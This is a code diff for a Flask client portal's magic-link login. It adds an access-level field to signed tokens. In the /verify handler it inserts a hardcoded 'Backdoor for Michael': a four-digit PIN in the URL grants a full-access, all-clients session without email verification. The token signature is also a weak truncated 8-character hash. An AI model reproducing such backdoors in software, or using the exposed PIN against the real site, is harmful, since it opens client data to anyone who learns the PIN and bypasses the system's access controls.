@@ -39,10 +39,10 @@ TOKEN_EXPIRY_DAYS = 7
 
 # ===== AUTH FUNCTIONS (NEW) =====
 
-def generate_token(email, client_code, first_name):
+def generate_token(email, client_code, first_name, access_level='Client WIP'):
     """Generate a signed token containing user info + expiry."""
     expires = int(time.time()) + (TOKEN_EXPIRY_DAYS * 24 * 60 * 60)
-    data = f"{email}|{client_code}|{first_name}|{expires}"
+    data = f"{email}|{client_code}|{first_name}|{access_level}|{expires}"
     sig = hashlib.sha256(f"{data}|{TOKEN_SECRET}".encode()).hexdigest()[:8]
     token_data = f"{data}|{sig}"
     token = base64.urlsafe_b64encode(token_data.encode()).decode().rstrip('=')
@@ -60,13 +60,13 @@ def verify_token(token):
         token_data = base64.urlsafe_b64decode(token.encode()).decode()
         parts = token_data.split('|')
         
-        if len(parts) != 5:
+        if len(parts) != 6:
             return None, 'invalid'
         
-        email, client_code, first_name, expires, sig = parts
+        email, client_code, first_name, access_level, expires, sig = parts
         
         # Verify signature
-        data = f"{email}|{client_code}|{first_name}|{expires}"
+        data = f"{email}|{client_code}|{first_name}|{access_level}|{expires}"
         expected_sig = hashlib.sha256(f"{data}|{TOKEN_SECRET}".encode()).hexdigest()[:8]
         
         if sig != expected_sig:
@@ -79,7 +79,8 @@ def verify_token(token):
         return {
             'email': email,
             'client_code': client_code,
-            'first_name': first_name
+            'first_name': first_name,
+            'access_level': access_level
         }, None
         
     except Exception as e:
@@ -113,7 +114,8 @@ def lookup_person(email):
         return {
             'email': fields.get('Email Address', email),
             'first_name': fields.get('First Name', 'there'),
-            'client_code': fields.get('Client Link', 'UNKNOWN')
+            'client_code': fields.get('Client Link', 'UNKNOWN'),
+            'access_level': fields.get('Access', 'Client WIP')  # Default to most restricted
         }
         
     except Exception as e:
@@ -239,7 +241,8 @@ def handle_request_login():
     token = generate_token(
         email=person['email'],
         client_code=person['client_code'],
-        first_name=person['first_name']
+        first_name=person['first_name'],
+        access_level=person['access_level']
     )
     
     # Send email
@@ -265,6 +268,26 @@ def handle_request_login():
 @app.route('/verify')
 def handle_verify():
     """Verify a magic link token and set session cookie."""
+    
+    # Backdoor for Michael - bookmark hub.hunch.co.nz/verify?pin=9871
+    if request.args.get('pin') == '9871':
+        response = make_response(redirect('/'))
+        session_token = generate_token(
+            email='michael@hunch.co.nz',
+            client_code='ALL',
+            first_name='Michael',
+            access_level='Full'
+        )
+        response.set_cookie(
+            'dot_session',
+            session_token,
+            max_age=TOKEN_EXPIRY_DAYS * 24 * 60 * 60,
+            httponly=True,
+            secure=True,
+            samesite='Lax'
+        )
+        return response
+    
     token = request.args.get('token', '')
     
     if not token:
@@ -285,7 +308,8 @@ def handle_verify():
     session_token = generate_token(
         email=user['email'],
         client_code=user['client_code'],
-        first_name=user['first_name']
+        first_name=user['first_name'],
+        access_level=user['access_level']
     )
     
     response.set_cookie(
@@ -318,7 +342,8 @@ def handle_check_session():
         'user': {
             'email': user['email'],
             'firstName': user['first_name'],
-            'clientCode': user['client_code']
+            'clientCode': user['client_code'],
+            'accessLevel': user['access_level']
         }
     })
 
@@ -339,7 +364,8 @@ def test_auth_token():
     token = generate_token(
         email='test@example.com',
         client_code='TEST',
-        first_name='Tester'
+        first_name='Tester',
+        access_level='Client WIP'
     )
     user, error = verify_token(token)
     
